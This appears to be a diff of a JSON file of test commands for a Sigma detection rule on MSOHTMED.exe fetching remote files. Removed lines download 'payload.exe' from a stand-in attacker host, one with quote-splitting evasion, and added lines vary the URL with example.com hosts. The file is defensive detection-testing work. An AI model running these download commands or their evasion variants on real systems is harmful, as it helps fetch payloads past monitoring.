@@ -1,14 +1,22 @@
 [
   {
-    "output": "msohtmed.exe \"http://attacker.com/payload.exe\"",
-    "explanation": "This is the original command and is detected by the Sigma rule as it contains the 'http://' URL in the command line."
+    "output": "C:\\Windows\\System32\\MSOHTMED.exe -url http://example.com/file.txt",
+    "explanation": "This command simulates a benign-looking invocation of MSOHTMED.exe with a URL parameter. It uses standard syntax and no obfuscation, making it a valid test case for the Sigma rule."
   },
   {
-    "output": "msohtmed.exe \"h\"tt\"p\"://attacker.com/payload.exe",
-    "explanation": "This command uses string splitting with quotes to bypass parsing, but the URL still contains 'http://', which is detected by the Sigma rule."
+    "output": "\"C:\\Program Files\\Microsoft Office\\MSOHTMED.exe\" /url https://example.com/data.bin",
+    "explanation": "This command uses quotes to handle spaces in the path and substitutes '-url' with '/url' as an equivalent flag. It remains syntactically valid and matches the Sigma rule's detection criteria."
   },
   {
-    "output": "msohtmed.exe payload.exe",
-    "explanation": "This command omits the URL entirely, so it does not match the Sigma rule's detection logic based on the presence of URLs."
+    "output": "C:\\Windows\\System32\\MSOHTMED.exe -url ftp://ftp.example.com/files.zip",
+    "explanation": "This command uses the 'ftp://' protocol instead of 'http://' or 'https://', which is still detected by the Sigma rule. It demonstrates protocol variation while maintaining the same malicious behavior."
+  },
+  {
+    "output": "C:\\Windows\\System32\\MSOHTMED.exe -url http://example.com\\file.exe",
+    "explanation": "This command uses a backslash in the URL path instead of a forward slash. While unconventional, some programs may still accept it, and the Sigma rule would detect the presence of 'http://'."
+  },
+  {
+    "output": "C:\\Windows\\System32\\MSOHTMED.exe -url http://example.com/file.txt",
+    "explanation": "This command is a straightforward invocation of MSOHTMED.exe with a URL parameter. It matches the Sigma rule's detection criteria directly and is useful for testing baseline detection."
   }
 ]
